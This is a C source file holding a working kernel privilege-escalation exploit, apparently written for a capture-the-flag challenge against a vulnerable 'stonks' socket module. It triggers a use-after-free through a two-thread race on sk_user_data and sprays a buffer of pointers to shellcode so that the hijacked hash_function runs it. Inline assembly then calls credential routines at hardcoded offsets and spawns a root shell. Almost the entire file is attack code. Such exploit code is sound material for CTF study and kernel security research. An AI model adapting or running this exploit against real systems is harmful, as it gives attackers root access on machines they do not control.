#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <errno.h>
#include <assert.h>
#include <poll.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <linux/userfaultfd.h>
#include "utils.h"

#define OPTION_CALL 0x1337
#define OPTION_PUT 0x1338
#define OPTION_DEBUG 0x1339

#define PORT 69696
typedef union {
    // OPTION_DEBUG
    struct {
        uint64_t off;
        uint64_t *data;
    };
    // OPTION_CALL
    struct {
        unsigned size;
        uint64_t rounds;
        uint64_t key;
        uint64_t security;
    };
} user_arg;

struct Hash {
    uint64_t word1;
    uint64_t word2;
    uint64_t word3;
    uint64_t word4;
    unsigned length;
    uint64_t rounds;
    uint64_t key;
};

struct StonksSocket {
    unsigned hash_size;
    uint64_t hash_rounds;
    uint64_t hash_key;
    int (*hash_function)(struct iov_iter *msg, struct Hash *hash);
};

uint64_t kernel_base, heap_base, modprobe_path;
uint64_t user_cs, user_sp, user_ss, user_rflags;

int victim_socket, attacker_socket;
int victim_socket_fd = -1, attacker_socket_fd = -1;
char buffer[0x80000] = {0}, recv_buffer[0x80000] = {0};

int SIGNAL = 0;

void save_state(void);
void shellcode(void);
int init_listener(int);
int init_speaker(int);
void *thread1(void); 
void *thread2(void);

int main(int argc, char **argv) 
{
    printf("[*] sizeof(user_arg): 0x%lx\n", sizeof(user_arg));
    printf("[*] sizeof(Hash): 0x%lx\n", sizeof(struct Hash));
    printf("[*] sizeof(StonksSocket): 0x%lx\n", sizeof(struct StonksSocket));
    puts("[*] stonks_ioct: 0xffffffffc0081180");
    puts("[*] stonks_rocket: 0xffffffffc0081110");
    puts("[*] secure_hash: 0xffffffffc0081010");
    printf("[*] shellcode: %p\n", shellcode);

    // create receiver socket
    int receiver_socket = init_listener(PORT);
     
    // prepare shellcode ptr to overwrite and call
    for (int i=0;i<0x80000/8;i++) 
        ((uint64_t*)buffer)[i] = (uint64_t) shellcode;
    
    // create sender receiver_socket 
    user_arg user_req = {
        .size = 0x4,
        .rounds = 1,
        .key = 0xcafebeef,
        .security = 1,
    };

    struct sockaddr tmp_addr;
    int len_addr = sizeof(tmp_addr);

    // https://stackoverflow.com/a/64386682
    // connect() puts an fd to queue, then accept() will pull it out => after calling init_speaker(), the next fd returned from accept() is from our previous initialized socket
    // create attacker_socket with connect(), then take its fd from accept()
    // NOTE: this explain is dumb, but careful with the order
    attacker_socket = init_speaker(PORT);
    attacker_socket_fd = accept(receiver_socket, &tmp_addr, &len_addr);
    assert(attacker_socket_fd != -1);
    assert(ioctl(attacker_socket_fd, OPTION_CALL, &user_req) == 0);
    assert(send(attacker_socket, buffer, 0x80000, 0) != -1);

    // create victim_socket with connect(), then take its fd from accept()
    victim_socket = init_speaker(PORT);
    victim_socket_fd = accept(receiver_socket, &tmp_addr, &len_addr);
    assert(victim_socket_fd != -1);
    assert(ioctl(victim_socket_fd, OPTION_CALL, &user_req) == 0);

    printf("[*] victim_socket_fd: %d\n", victim_socket_fd);
    printf("[*] attacker_socket_fd: %d\n", attacker_socket_fd);
    /* invoke race 
    _ prepare state: init attacker_socket and victim_socket, then send a huge payload to attacker_socket (its our payload contains shellcode ptr)
    _ first, main thread will call recv() in victim_socket, but currently there is no buffer sent to victim_socket and because there is no lock in function tcp_recvmsg()
        => victim_socket hanged at stonks_rocket()
    _ create 2 threads, thread 1 changes the SIGNAL to 1, wait a lil bit  
    _ thread 2 wait until SIGNAL changed to 1, then immediately free sk_user_data of victim_socket and recv() the huge payload sent in the prepare state
    _ after a lil wait, thread 1 send any buffer to victim_socket, this release the victim_socket from hang
        =>victim_socket calls sk->hash_function which is overwrited to our shellcode
    _ profit?
    */ 

    puts("[+] Starting race!");
    pthread_t thread1_tid, thread2_tid;
    pthread_create(&thread1_tid, NULL, thread1, NULL);
    pthread_create(&thread2_tid, NULL, thread2, NULL);

    // wait 2 threads to init
    usleep(5000);

    puts("[!] victim_socket receiving buffer");
    printf("victim_socket_fd in main thread: %d\n", victim_socket_fd);

    recv(victim_socket_fd, recv_buffer, 0x100, 0);

    sleep(1);
    if (getuid() != 0) {
        panic("\n[!] couldn't get root...");
    } else {
        puts("\n\n[+] enjoy your root.");
        system("/bin/sh");
    }

    return 0;
}

int init_listener(int port)
{
    printf("[+] Create listening socket - port: %d\n", port);    
    int lsock = socket(AF_INET, SOCK_STREAM, 0);
    if (lsock < 0) 
        panic("[!] Error when create listening socket!");
    struct sockaddr_in laddr;
    bzero(&laddr, sizeof(laddr));
    laddr.sin_family = AF_INET;
    laddr.sin_port = htons(port);
    laddr.sin_addr.s_addr = htonl(INADDR_ANY);
     
    assert(bind(lsock, (struct sockaddr*)&laddr, sizeof(laddr)) != -1);
    assert(listen(lsock, 999) == 0);

    return lsock;
}

int init_speaker(int port) 
{
    printf("[+] Create speaking socket - port: %d\n", port);
    int ssock = socket(AF_INET, SOCK_STREAM, 0);
    if (ssock < 0)
        panic("[!] Error when create speaking socket!");
    struct sockaddr_in saddr;
    bzero(&saddr, sizeof(saddr));
    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(port);
    saddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    
    assert(connect(ssock, &saddr, sizeof(saddr)) == 0);
    
    return ssock;
}

void *thread1()
{
    puts("[+] Free and overwrite thread");
    while (!SIGNAL);

    // Free sk_user_data in victim_socket_fd -> create a dangling pointer of sk_user_data
    ioctl(victim_socket_fd, OPTION_PUT, NULL);

    // Continously recv in attacker_socket_fs -> trigger secure_hash
    // -> the loop in secure_hash() constantly kmalloc and kfree a 0x20 chunks -> we alloc sk_user_data again and write our data to it 
    while (1) {
        recv(attacker_socket_fd, recv_buffer, 0x80000, 0);
    }

    return NULL;
}

void *thread2()
{
    puts("[+] This thread just wait and signal");
    usleep(1500000);
    // signal start thread1
    SIGNAL=1;

    usleep(3000);
    char tmp[8];
    puts("[+] victim_socket sending buffer");
    printf("%d\n", send(victim_socket, tmp, 8, 0));
}

void shellcode(void)
{
  asm(
    "mov rax, [rsp+0xc8]\n"
    "sub rax, 0x3e5dbd\n"
    "xor rdi, rdi\n"
    "call rax\n"
    "mov rdi, rax\n"
    "mov rax, [rsp+0xc8]\n"
    "sub rax, 0x3e62bd\n"
    "call rax\n"
    "leave\n"
    "ret\n"
  );
}

